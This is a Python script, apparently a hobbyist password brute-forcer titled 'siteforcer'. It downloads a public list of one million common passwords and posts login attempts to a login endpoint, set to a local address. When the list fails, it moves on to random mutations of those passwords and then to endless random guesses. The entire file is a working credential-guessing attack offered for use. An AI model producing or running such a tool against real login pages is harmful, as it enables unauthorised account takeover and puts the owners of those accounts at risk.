import requests
import random
import string
from concurrent.futures import ThreadPoolExecutor
print("Loading brutforcer wait...")
# URL to the password list
password_list_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
print("Loading passwords...")
# Load the list of passwords from URL
response = requests.get(password_list_url)
passwords = response.text.splitlines()

logo = """
██████╗ ██████╗ ██╗   ██╗████████╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██║   ██║██████╔╝██║     █████╗
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝
██████╔╝██║  ██║╚██████╔╝   ██║   ██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
                      @ewinnery siteforcer
                       Has {} passwords
""".format(len(passwords))

print(logo)

def attempt_login(url, login, password):
    print(f"brutforcing {login}: {password}")
    response = requests.post(url, data={'username': login, 'password': password})
    if response.status_code == 200 and 'Login successful' in response.json().get('message', ''):
        return True
    return False

def mutate_password(password):
    chars = string.ascii_letters + string.digits + string.punctuation
    mutated = list(password)
    # Randomly change some characters
    for _ in range(len(mutated)):
        if random.random() > 0.8:  # 20% chance to mutate each character
            mutated[random.randint(0, len(mutated) - 1)] = random.choice(chars)
    return ''.join(mutated)

def generate_passwords():
    chars = string.ascii_letters + string.digits + string.punctuation
    while True:
        length = random.randint(6, 20)
        yield ''.join(random.choice(chars) for _ in range(length))

def bruteforce_passwords(login, passwords):
    # Pass through provided passwords
    for password in passwords:
        if attempt_login("http://127.0.0.1:5000/login", login, password):
            print(f"Login successful: {login}/{password}")
            return True

    # If provided passwords did not work, move to password mutation
    print("Mutating passwords...")
    for i in range(30):  # Try up to 30 variations of each password
        for password in passwords:
            mutated_password = mutate_password(password)
            if attempt_login("http://127.0.0.1:5000/login", login, mutated_password):
                print(f"Login successful: {login}/{mutated_password}")
                return True

    # If mutations did not work, move to generating new passwords
    print("Generating new passwords...")
    for password in generate_passwords():
        if attempt_login("http://127.0.0.1:5000/login", login, password):
            print(f"Login successful: {login}/{password}")
            return True

    return False

while True:
    login = input("Login to brutforce: ")
    if login == "":
        break

    with ThreadPoolExecutor(max_workers=10) as executor:
        if executor.submit(bruteforce_passwords, login, passwords).result():
            break

print("Successfully brutforced password!")
